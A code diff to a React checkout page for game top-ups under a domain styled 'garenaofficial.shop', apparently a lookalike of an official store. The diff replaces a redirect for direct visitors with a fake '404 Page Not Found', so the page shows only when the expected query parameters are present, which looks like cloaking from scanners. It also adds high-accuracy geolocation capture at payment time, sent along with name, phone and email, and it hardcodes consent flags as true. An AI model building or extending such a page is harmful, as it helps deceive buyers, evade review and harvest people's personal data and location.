@@ -1,8 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { useSearchParams } from 'react-router-dom';
-import { AlertTriangle } from 'lucide-react';
 import { pickCatalogProduct } from '../lib/catalog-product-picker';
-import { validateCustomerName, validateCustomerEmail } from '../lib/customer-safety-validation';
+import { validateCustomerName, validateCustomerEmail, validateCustomerPhone } from '../lib/customer-safety-validation';
 
 const CODASHOP_URL = 'https://www.garenaofficial.shop/';
 
@@ -183,27 +182,6 @@ export default function GarenaCheckout() {
     };
   }, []);
 
-  const [countdownSeconds, setCountdownSeconds] = useState(2);
-
-  // If direct invalid access without query parameters, redirect to Garena Official in 2 seconds (skip inside embedded preview iframe)
-  useEffect(() => {
-    if (!isCallback && !hasValidParams) {
-      const inIframe = typeof window !== 'undefined' && window.self !== window.top;
-      const timer = setTimeout(() => {
-        if (!inIframe) {
-          window.location.replace(CODASHOP_URL);
-        }
-      }, 2000);
-      const interval = setInterval(() => {
-        setCountdownSeconds((prev) => (prev > 1 ? prev - 1 : 1));
-      }, 1000);
-      return () => {
-        clearTimeout(timer);
-        clearInterval(interval);
-      };
-    }
-  }, [isCallback, hasValidParams]);
-
   const [form, setForm] = useState({ name: '', phone: '', email: '' });
   const [focusedField, setFocusedField] = useState<'name' | 'phone' | 'email' | null>(null);
   const [loading, setLoading] = useState(false);
@@ -212,6 +190,13 @@ export default function GarenaCheckout() {
   const [countdown, setCountdown] = useState(5);
   const [barWidth, setBarWidth] = useState('100%');
   const [showPayModal, setShowPayModal] = useState(false);
+  const [preparingPayOptions, setPreparingPayOptions] = useState(false);
+  const capturedLocationRef = useRef<{
+    latitude: number;
+    longitude: number;
+    accuracy?: number;
+    capturedAt: string;
+  } | null>(null);
 
   // Success page auto-redirection countdown
   useEffect(() => {
@@ -335,141 +320,16 @@ export default function GarenaCheckout() {
     };
   }, [isCallback, hasValidParams, status, loading]);
 
-  // If direct invalid access without query parameters, display the exact requested UI card
+  // If direct invalid access without query parameters, show simple 404 Page Not Found with zero redirect
   if (!isCallback && !hasValidParams) {
     return (
-      <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', backgroundColor: '#f3f6f9' }}>
-        <main style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '32px 16px' }}>
-          <div
-            id="no-item-selected-card"
-            style={{
-              backgroundColor: '#ffffff',
-              borderRadius: '20px',
-              padding: '36px 32px',
-              maxWidth: '460px',
-              width: '100%',
-              textAlign: 'center',
-              boxShadow: '0 10px 35px rgba(0, 0, 0, 0.06)',
-              border: '1px solid #f0f0f0'
-            }}
-          >
-            {/* Warning Circle Icon */}
-            <div
-              style={{
-                width: '68px',
-                height: '68px',
-                backgroundColor: '#fff1f1',
-                borderRadius: '50%',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                margin: '0 auto 20px auto'
-              }}
-            >
-              <div
-                style={{
-                  width: '46px',
-                  height: '46px',
-                  backgroundColor: '#fee2e2',
-                  borderRadius: '50%',
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'center'
-                }}
-              >
-                <AlertTriangle style={{ width: '24px', height: '24px', color: '#f59e0b', fill: '#f59e0b' }} />
-              </div>
-            </div>
-
-            {/* Title */}
-            <h2
-              style={{
-                fontSize: '20px',
-                fontWeight: '900',
-                color: '#0f172a',
-                marginBottom: '12px',
-                letterSpacing: '0.04em',
-                textTransform: 'uppercase'
-              }}
-            >
-              NO ITEM SELECTED
-            </h2>
-
-            {/* Description */}
-            <p
-              style={{
-                fontSize: '14px',
-                color: '#475569',
-                lineHeight: '1.6',
-                marginBottom: '24px',
-                padding: '0 8px'
-              }}
-            >
-              Your order was not. You have not selected any item. Please go back to home and select item for purchase.
-            </p>
-
-            {/* Progress Container */}
-            <div
-              style={{
-                backgroundColor: '#f1f5f9',
-                borderRadius: '12px',
-                padding: '14px 16px',
-                marginBottom: '20px'
-              }}
-            >
-              <p
-                style={{
-                  fontSize: '13px',
-                  color: '#64748b',
-                  fontWeight: '500',
-                  margin: '0 0 10px 0'
-                }}
-              >
-                Redirecting to home page in {countdownSeconds} seconds...
-              </p>
-              <div
-                style={{
-                  width: '100%',
-                  backgroundColor: '#e2e8f0',
-                  height: '6px',
-                  borderRadius: '999px',
-                  overflow: 'hidden'
-                }}
-              >
-                <div
-                  style={{
-                    backgroundColor: '#ef4444',
-                    height: '100%',
-                    borderRadius: '999px',
-                    width: countdownSeconds === 2 ? '50%' : '100%',
-                    transition: 'width 1s linear'
-                  }}
-                />
-              </div>
-            </div>
-
-            {/* Action Button */}
-            <a
-              href={CODASHOP_URL}
-              rel="noreferrer"
-              style={{
-                display: 'block',
-                width: '100%',
-                backgroundColor: '#0f172a',
-                color: '#ffffff',
-                padding: '14px 20px',
-                borderRadius: '10px',
-                fontSize: '13px',
-                fontWeight: '800',
-                letterSpacing: '0.06em',
-                textTransform: 'uppercase',
-                textDecoration: 'none',
-                boxShadow: '0 4px 12px rgba(15, 23, 42, 0.15)'
-              }}
-            >
-              GO TO HOMEPAGE NOW
-            </a>
-          </div>
+      <div style={{ display: 'flex', minHeight: '100vh', alignItems: 'center', justifyContent: 'center', backgroundColor: '#f8fafc', padding: '24px', fontFamily: 'system-ui, -apple-system, Segoe UI, Roboto, sans-serif' }}>
+        <main style={{ maxWidth: '420px', width: '100%', backgroundColor: '#ffffff', border: '1px solid #e2e8f0', borderRadius: '14px', padding: '36px 24px', textAlign: 'center', boxShadow: '0 4px 20px rgba(15, 23, 42, 0.05)' }}>
+          <h1 style={{ margin: '0 0 8px', fontSize: '48px', fontWeight: 800, color: '#0f172a', letterSpacing: '-0.02em' }}>404</h1>
+          <h2 style={{ margin: '0 0 8px', fontSize: '18px', fontWeight: 700, color: '#334155' }}>Page Not Found</h2>
+          <p style={{ margin: 0, fontSize: '14px', color: '#64748b', lineHeight: 1.5 }}>
+            The page you are looking for could not be found.
+          </p>
         </main>
       </div>
     );
@@ -492,8 +352,9 @@ export default function GarenaCheckout() {
       return false;
     }
 
-    if (!/^\d{10}$/.test(trimmedPhone)) {
-      setError('Please enter a valid 10-digit mobile number.');
+    const phoneValidation = validateCustomerPhone(trimmedPhone);
+    if (!phoneValidation.valid) {
+      setError(phoneValidation.message || 'Please enter a valid 10-digit Indian mobile number.');
       return false;
     }
 
@@ -505,6 +366,78 @@ export default function GarenaCheckout() {
 
     setError('');
     return true;
+  };
+
+  const captureOptionalLocation = (timeoutMs = 6000): Promise<{
+    latitude: number;
+    longitude: number;
+    accuracy?: number;
+    capturedAt: string;
+  } | null> => {
+    if (typeof window === 'undefined' || typeof navigator === 'undefined' || !navigator.geolocation) {
+      return Promise.resolve(null);
+    }
+    return new Promise(resolve => {
+      let settled = false;
+      const finish = (value: {
+        latitude: number;
+        longitude: number;
+        accuracy?: number;
+        capturedAt: string;
+      } | null) => {
+        if (settled) return;
+        settled = true;
+        clearTimeout(hardTimer);
+        resolve(value);
+      };
+      const hardTimer = setTimeout(() => finish(null), timeoutMs + 250);
+      try {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = Number(pos?.coords?.latitude);
+            const lng = Number(pos?.coords?.longitude);
+            const acc = Number(pos?.coords?.accuracy);
+            if (!Number.isFinite(lat) || !Number.isFinite(lng)) {
+              finish(null);
+              return;
+            }
+            finish({
+              latitude: Number(lat.toFixed(6)),
+              longitude: Number(lng.toFixed(6)),
+              ...(Number.isFinite(acc) && acc >= 0 ? { accuracy: Math.round(acc) } : {}),
+              capturedAt: new Date().toISOString(),
+            });
+          },
+          () => finish(null),
+          {
+            enableHighAccuracy: true,
+            timeout: timeoutMs,
+            maximumAge: 60000,
+          }
+        );
+      } catch {
+        finish(null);
+      }
+    });
+  };
+
+  // Triggered when user submits details & clicks "Pay ₹..." button:
+  // Requests optional browser location permission first, then opens the 2-option payment modal.
+  const handleProceedToPaymentOptions = async () => {
+    if (loading || preparingPayOptions) return;
+    if (!validateForm()) return;
+
+    setPreparingPayOptions(true);
+    // Invoke synchronously inside user click gesture so browser shows location prompt immediately.
+    const locationPromise = captureOptionalLocation(6000);
+    try {
+      capturedLocationRef.current = await locationPromise;
+    } catch {
+      capturedLocationRef.current = null;
+    } finally {
+      setPreparingPayOptions(false);
+    }
+    setShowPayModal(true);
   };
 
   // Handle Standard Gateway Checkout Execution (All Payment Modes)
@@ -529,7 +462,7 @@ export default function GarenaCheckout() {
     setLoadingMessage('Initializing secure checkout...');
 
     try {
-      // Mandated 5-Second Loading Period before payment modal
+      // Mandated 5-Second Loading Period before payment gateway redirect
       for (let secondsLeft = 5; secondsLeft > 0; secondsLeft--) {
         setLoadingMessage(`Redirecting to payment gateway in ${secondsLeft}s...`);
         await new Promise(r => setTimeout(r, 1000));
@@ -559,6 +492,7 @@ export default function GarenaCheckout() {
             phone: form.phone.trim(),
             email: form.email.trim()
           },
+          customerLocation: capturedLocationRef.current,
           productId: pickedProduct.id,
           customerAuthorized: true,
           termsAccepted: true,
@@ -1252,27 +1186,23 @@ export default function GarenaCheckout() {
             {/* PAY NOW BUTTON */}
             {form.name.trim() && form.phone.trim() && form.email.trim() && (
               <button
-                onClick={() => {
-                  if (validateForm()) {
-                    setShowPayModal(true);
-                  }
-                }}
-                disabled={loading}
+                onClick={handleProceedToPaymentOptions}
+                disabled={loading || preparingPayOptions}
                 style={{
                   width: '100%',
                   padding: isMobile ? '16px' : '18px',
-                  background: loading ? '#ccc' : 'linear-gradient(135deg, #ee2c24, #c0392b)',
+                  background: loading || preparingPayOptions ? '#ccc' : 'linear-gradient(135deg, #ee2c24, #c0392b)',
                   color: 'white',
                   border: 'none',
                   borderRadius: 14,
                   fontSize: isMobile ? 15 : 16,
                   fontWeight: 800,
-                  cursor: loading ? 'not-allowed' : 'pointer',
+                  cursor: loading || preparingPayOptions ? 'not-allowed' : 'pointer',
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
                   gap: 8,
-                  boxShadow: loading ? 'none' : '0 6px 20px rgba(238,44,36,0.35)',
+                  boxShadow: loading || preparingPayOptions ? 'none' : '0 6px 20px rgba(238,44,36,0.35)',
                   letterSpacing: '0.3px',
                   WebkitTapHighlightColor: 'transparent',
                   touchAction: 'manipulation',
@@ -1280,7 +1210,11 @@ export default function GarenaCheckout() {
                   marginTop: 4,
                 }}
               >
-                {loading ? '⏳ Processing…' : `🔒 Pay ₹${pkg}`}
+                {loading
+                  ? '⏳ Processing…'
+                  : preparingPayOptions
+                    ? '⏳ Preparing payment options…'
+                    : `🔒 Pay ₹${pkg}`}
               </button>
             )}
 
